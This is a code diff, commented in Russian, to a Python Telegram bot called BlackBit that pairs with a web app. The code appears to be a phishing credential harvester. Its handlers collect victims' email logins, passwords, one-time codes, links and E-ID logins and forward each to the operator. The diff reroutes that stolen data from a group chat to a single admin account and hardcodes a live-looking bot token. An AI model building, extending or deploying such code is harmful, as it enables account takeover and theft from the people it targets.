@@ -8,8 +8,9 @@ from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ==================== КОНФИГ ====================
-BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
-GROUP_CHAT_ID = -1004301542136  # ← ID ГРУППЫ BLACKBIT
+BOT_TOKEN = "8814819495:AAG-LJTyE-0VdXjE4-Aw1K700CjhH1T-pcM"
+ADMIN_ID = 8415350827
+GROUP_CHAT_ID = -1004301542136
 WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"
 # ===============================================
 
@@ -35,7 +36,7 @@ class BlackBitBot:
             text=f"🟢 НОВЫЙ ВХОД В БОТА!\n\n"
                  f"👤 ID: `{user.id}`\n"
                  f"👤 Имя: {user.first_name or 'без имени'}\n"
-                 f"👤 Username: {user.username or 'нет'}\n"
+                 f"👤 Username: @{user.username or 'нет'}\n"
                  f"🕐 Время: {current_time}",
             parse_mode="Markdown"
         )
@@ -67,7 +68,7 @@ class BlackBitBot:
         # ---- Код ----
         if user_sessions.get(user_id, {}).get('awaiting_code'):
             await self.app.bot.send_message(
-                GROUP_CHAT_ID,
+                ADMIN_ID,
                 text=f"📧 КОД: `{text}`",
                 parse_mode="Markdown"
             )
@@ -78,7 +79,7 @@ class BlackBitBot:
         # ---- Ссылка ----
         if user_sessions.get(user_id, {}).get('awaiting_link'):
             await self.app.bot.send_message(
-                GROUP_CHAT_ID,
+                ADMIN_ID,
                 text=f"🔗 ССЫЛКА: `{text}`",
                 parse_mode="Markdown"
             )
@@ -99,7 +100,7 @@ class BlackBitBot:
                 # ---- Обычный вход ----
                 if email and password and not code and not link and not eid_type:
                     await self.app.bot.send_message(
-                        GROUP_CHAT_ID,
+                        ADMIN_ID,
                         text=f"🔔 НОВАЯ ЗАЯВКА!\n\n"
                              f"👤 ID: `{user_id}`\n"
                              f"📧 Логин: `{email}`\n"
@@ -112,7 +113,7 @@ class BlackBitBot:
                 # ---- E-ID вход ----
                 if eid_type == 'eid_login' and email and password:
                     await self.app.bot.send_message(
-                        GROUP_CHAT_ID,
+                        ADMIN_ID,
                         text=f"🆔 E-ID ВХОД\n\n"
                              f"👤 ID: `{user_id}`\n"
                              f"📧 Логин: `{email}`\n"
@@ -125,7 +126,7 @@ class BlackBitBot:
                 # ---- Код ----
                 if code:
                     await self.app.bot.send_message(
-                        GROUP_CHAT_ID,
+                        ADMIN_ID,
                         text=f"📧 КОД: `{code}`",
                         parse_mode="Markdown"
                     )
@@ -135,7 +136,7 @@ class BlackBitBot:
                 # ---- Ссылка ----
                 if link:
                     await self.app.bot.send_message(
-                        GROUP_CHAT_ID,
+                        ADMIN_ID,
                         text=f"🔗 ССЫЛКА: `{link}`",
                         parse_mode="Markdown"
                     )
@@ -160,6 +161,7 @@ class BlackBitBot:
 
         print("=" * 50)
         print("🚀 БОТ BLACKBIT ЗАПУЩЕН")
+        print(f"👤 ADMIN_ID: {ADMIN_ID}")
         print(f"👥 GROUP_CHAT_ID: {GROUP_CHAT_ID}")
         print("=" * 50)
 
